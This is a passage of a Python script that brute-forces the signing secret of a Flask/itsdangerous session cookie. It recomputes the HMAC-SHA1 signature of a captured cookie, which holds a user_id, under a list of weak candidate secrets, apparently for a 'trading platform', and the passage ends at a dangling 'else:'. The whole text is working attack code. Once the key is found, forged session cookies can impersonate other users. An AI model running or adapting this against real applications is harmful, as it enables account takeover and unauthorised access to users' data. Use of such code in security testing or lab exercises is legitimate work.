import base64, hmac, hashlib

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=')

payload = b'eyJ1c2VyX2lkIjoxMDAzMn0'
ts = b'aYTVKQ'
sig_provided = b'IPWqBq1i2tHdpiaEKReVT-dcXqg'
msg = payload + b'.' + ts

def sign(secret):
    salt = b'cookie-session'
    # itsdangerous default key_derivation='concat': sha1(salt + secret).digest()
    key = hashlib.sha1(salt + secret).digest()
    mac = hmac.new(key, msg=msg, digestmod=hashlib.sha1).digest()
    return b64u(mac)

for cand in [b'secret', b'secret-key', b'dev', b'development', b'changeme', b'secretkey', b'supersecret', b'super-secret-key', b'debug', b'thisisasecret', b'flask-secret-key', b'trading-platform', b'tradingplatform', b'app-secret-key', b'key', b'mysecret', b'notasecret']:
    s = sign(cand)
    if s == sig_provided:
        print('FOUND', cand)
        break
else:
